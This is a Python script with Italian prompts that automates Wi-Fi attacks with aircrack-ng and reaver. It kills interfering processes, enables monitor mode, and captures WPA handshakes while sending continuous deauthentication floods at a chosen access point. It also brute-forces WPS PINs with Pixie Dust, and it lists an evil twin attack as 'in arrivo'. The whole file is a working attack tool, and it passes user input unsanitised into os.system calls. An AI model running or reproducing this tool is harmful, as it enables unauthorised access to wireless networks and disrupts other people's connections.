import os
from time import sleep
import sys
from colorama import Fore

title = """
██╗    ██╗██╗███████╗██╗    ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║    ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║    ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║    ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ███╔███╔╝██║██║     ██║    ██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                        """

def delay_print(s):
    for n in s:
        sys.stdout.write(n)
        sys.stdout.flush()
        sleep(0.04)

def cap_handshake():
    os.system("clear")

    os.system("iwconfig")

    interfaccia = input("Scrivi il nome dell'interfaccia che si vuole usare: ")

    try:
        os.system("airmon-ng check kill")

        sleep(1)

        os.system(f"airmon-ng start {interfaccia}")

        delay_print("Monitor mode attivata con successo!\n")

        sleep(2)
        
        delay_print("Avvio scan reti... Premere CTRL+C per fermare")

        os.system(f"airodump-ng {interfaccia} -M")

        os.system("sleep 3")

        BSSID = input("BSSID RETE TARGET: ")

        canale = input("CANALE RETE: ")

        delay_print("Attacco in avvio...")
        delay_print("Una volta trovato l'handshake premere CTRL+C per fermare lo script")

        sleep(2)

        os.system(f"airodump-ng -w {BSSID} -c {canale} --bssid {BSSID} {interfaccia} | xterm -e aireplay-ng -0 0 -a {BSSID} {interfaccia}")

    except Exception as b:
        print(b)
        sys.exit(3)

def crack_wps_pin():
    os.system("clear")

    os.system("iwconfig")

    interfaccia = input("Scrivi il nome dell'interfaccia che si vuole usare: ")

    try:
        os.system("airmon-ng check kill")

        sleep(1)

        os.system(f"airmon-ng start {interfaccia}")

        delay_print("Monitor mode attivata con successo!\n")

        sleep(2)
        
        delay_print("Avvio scan reti... Premere CTRL+C per fermare")

        os.system(f"airodump-ng {interfaccia} -M")

        os.system("sleep 3")

        BSSID = input("BSSID RETE TARGET: ")

        canale = input("CANALE RETE: ")
        
        delay = input("Delay fra  una richiesta e l'altra(Consigliato 55)")

        delay_print("Attacco in avvio...")

        sleep(2)

        os.system(f"reaver -i {interfaccia} -d {delay} -c {canale} -b {BSSID} -K -S -vv")

    except Exception as e:
        print(e)
        sys.exit(3)

def main():
    print(Fore.RED + title)

    delay_print("Wifi hacking automation script\n")
    delay_print("Lo script deve essere eseguito come amministratore!")

    sleep(2)

    delay_print(Fore.GREEN + "\n\n1) Cattura Handshake")
    delay_print("\n2) Crack WPS Pin")
    delay_print("\n3) Evil Twin Attack")

    scelta = input("\nCosa desideri fare? ")

    if scelta == "1":
        cap_handshake()
        
    elif scelta == "2":
        crack_wps_pin()

    elif scelta == "3":
        print("In arrivo...")
        sleep(2)
        main()
    else:
        print("Qualcosa è andato storto... Riavvio...")
        sleep(2)
        main()    

if __name__ == "__main__":
    main()
